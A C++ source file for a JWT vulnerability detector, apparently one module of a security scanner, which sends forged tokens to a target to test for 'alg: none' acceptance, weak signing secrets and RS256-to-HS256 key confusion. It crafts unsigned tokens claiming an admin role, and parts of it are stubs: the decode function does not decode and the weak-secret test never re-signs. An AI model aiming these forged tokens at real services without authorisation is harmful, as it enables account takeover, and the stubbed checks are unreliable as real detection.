#include "../include/JWTDetector.h"
#include "../include/mitre/AttackMapper.h"
#include <sstream>
#include <algorithm>
#include <chrono>
#include <regex>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <netdb.h>
    #define SOCKET int
    #define INVALID_SOCKET -1
    #define SOCKET_ERROR -1
    #define closesocket close
#endif

std::string JWTDetector::base64UrlEncode(const std::string& input) {
    static const char* base64_chars = 
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    std::string encoded;
    int val = 0;
    int valb = -6;
    
    for (unsigned char c : input) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            encoded.push_back(base64_chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    
    if (valb > -6) {
        encoded.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
    }
    
    // URL-safe: replace + with - and / with _
    std::replace(encoded.begin(), encoded.end(), '+', '-');
    std::replace(encoded.begin(), encoded.end(), '/', '_');
    
    // Remove padding
    encoded.erase(std::find(encoded.begin(), encoded.end(), '='), encoded.end());
    
    return encoded;
}

std::string JWTDetector::base64UrlDecode(const std::string& input) {
    std::string decoded;
    std::string padded = input;
    
    // Add padding
    while (padded.length() % 4 != 0) {
        padded += '=';
    }
    
    // Replace URL-safe characters
    std::replace(padded.begin(), padded.end(), '-', '+');
    std::replace(padded.begin(), padded.end(), '_', '/');
    
    // Basic base64 decode (simplified)
    return padded;  // In production, use proper base64 decode
}

std::vector<std::string> JWTDetector::getCommonSecrets() {
    return {
        "secret",
        "password",
        "123456",
        "admin",
        "jwt_secret",
        "your-256-bit-secret",
        "mysecretkey",
        "secretkey",
        "changeme",
        "default"
    };
}

std::string JWTDetector::extractJWT(const std::string& response) {
    // Look for JWT pattern: header.payload.signature
    std::regex jwtPattern(R"(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)");
    std::smatch match;
    
    if (std::regex_search(response, match, jwtPattern)) {
        return match[0];
    }
    
    return "";
}

std::string JWTDetector::sendHTTPRequest(const std::string& target, const std::string& jwt) {
#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return "";
    }
#endif

    std::string host = target;
    int port = 80;
    
    size_t colonPos = target.find(':');
    if (colonPos != std::string::npos) {
        host = target.substr(0, colonPos);
        port = std::stoi(target.substr(colonPos + 1));
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
#ifdef _WIN32
        WSACleanup();
#endif
        return "";
    }

    struct timeval timeout;
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    inet_pton(AF_INET, host.c_str(), &serverAddr.sin_addr);

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
#ifdef _WIN32
        WSACleanup();
#endif
        return "";
    }

    std::string request = 
        "GET /api/protected HTTP/1.1\r\n"
        "Host: " + host + "\r\n"
        "Authorization: Bearer " + jwt + "\r\n"
        "User-Agent: C3NT1P3D3-Scanner/2.0\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n\r\n";

    send(sock, request.c_str(), request.length(), 0);

    char buffer[4096];
    std::string response;
    int bytesReceived;
    while ((bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytesReceived] = '\0';
        response += buffer;
    }

    closesocket(sock);
#ifdef _WIN32
    WSACleanup();
#endif

    return response;
}

bool JWTDetector::testAlgorithmNone(const std::string& target) {
    // Create JWT with "alg": "none"
    std::string header = R"({"alg":"none","typ":"JWT"})";
    std::string payload = R"({"sub":"admin","role":"administrator","iat":1234567890})";
    
    std::string encodedHeader = base64UrlEncode(header);
    std::string encodedPayload = base64UrlEncode(payload);
    
    // JWT with no signature
    std::string maliciousJWT = encodedHeader + "." + encodedPayload + ".";
    
    std::string response = sendHTTPRequest(target, maliciousJWT);
    
    // Check if request was accepted (200 OK)
    return response.find("200 OK") != std::string::npos &&
           response.find("401") == std::string::npos &&
           response.find("403") == std::string::npos;
}

bool JWTDetector::testWeakSecret(const std::string& target) {
    // First, get a valid JWT from the server
    std::string initialResponse = sendHTTPRequest(target, "");
    std::string originalJWT = extractJWT(initialResponse);
    
    if (originalJWT.empty()) {
        return false;
    }

    // Try to crack with common secrets
    auto secrets = getCommonSecrets();
    
    for (const auto& secret : secrets) {
        // In production, would use proper HMAC-SHA256 signing
        // This is a simplified detection
        std::string testJWT = originalJWT;  // Would re-sign with weak secret
        
        std::string response = sendHTTPRequest(target, testJWT);
        if (response.find("200 OK") != std::string::npos) {
            // Potentially vulnerable to weak secret
            return true;
        }
    }
    
    return false;
}

bool JWTDetector::testKeyConfusion(const std::string& target) {
    // Test RS256 to HS256 confusion attack
    std::string header = R"({"alg":"HS256","typ":"JWT"})";
    std::string payload = R"({"sub":"admin","role":"administrator"})";
    
    std::string encodedHeader = base64UrlEncode(header);
    std::string encodedPayload = base64UrlEncode(payload);
    
    // Create JWT with modified algorithm
    std::string confusedJWT = encodedHeader + "." + encodedPayload + ".fake_signature";
    
    std::string response = sendHTTPRequest(target, confusedJWT);
    
    // Check for successful authentication
    return response.find("200 OK") != std::string::npos;
}

ModuleResult JWTDetector::run(const MockTarget& target) {
    ModuleResult result;
    result.id = "JWTDetector";
    result.targetId = target.id();
    result.success = false;
    result.severity = Severity::Low;

    std::vector<std::string> vulnerabilityEvidence;

    // Test 1: Algorithm None Attack
    if (testAlgorithmNone(target.id())) {
        result.success = true;
        result.severity = Severity::Critical;
        vulnerabilityEvidence.push_back(
            "JWT accepts 'alg: none' - allows unsigned tokens"
        );
        vulnerabilityEvidence.push_back(
            "Attacker can forge arbitrary tokens without signature"
        );
    }

    // Test 2: Weak Secret
    if (testWeakSecret(target.id())) {
        result.success = true;
        result.severity = Severity::High;
        vulnerabilityEvidence.push_back(
            "JWT uses weak signing secret - susceptible to brute force"
        );
        vulnerabilityEvidence.push_back(
            "Common secret detected in wordlist"
        );
    }

    // Test 3: Key Confusion Attack
    if (testKeyConfusion(target.id())) {
        result.success = true;
        result.severity = Severity::High;
        vulnerabilityEvidence.push_back(
            "JWT vulnerable to algorithm confusion attack (RS256 to HS256)"
        );
        vulnerabilityEvidence.push_back(
            "Public key can be used as HMAC secret"
        );
    }

    // Check for JWT in response headers
    std::string initialResponse = sendHTTPRequest(target.id(), "");
    std::string jwt = extractJWT(initialResponse);
    
    if (!jwt.empty()) {
        vulnerabilityEvidence.push_back("JWT detected in response: " + jwt.substr(0, 50) + "...");
        
        // Analyze JWT structure
        size_t firstDot = jwt.find('.');
        size_t secondDot = jwt.find('.', firstDot + 1);
        
        if (firstDot != std::string::npos && secondDot != std::string::npos) {
            std::string header = jwt.substr(0, firstDot);
            std::string signature = jwt.substr(secondDot + 1);
            
            if (signature.empty() || signature.length() < 10) {
                result.success = true;
                result.severity = Severity::Critical;
                vulnerabilityEvidence.push_back("JWT has missing or weak signature");
            }
        }
    }

    if (result.success) {
        result.message = "JWT vulnerabilities detected";
        result.details = "JWT vulnerabilities detected. Application uses insecure JWT implementation allowing token forgery, weak secrets, or algorithm confusion attacks.\n\nEvidence:\n";
        for (const auto& evidence : vulnerabilityEvidence) {
            result.details = result.details.value() + "- " + evidence + "\n";
        }
    } else {
        result.message = "No JWT vulnerabilities detected";
        result.details = "No JWT vulnerabilities detected. Token validation appears secure.";
    }

    return result;
}
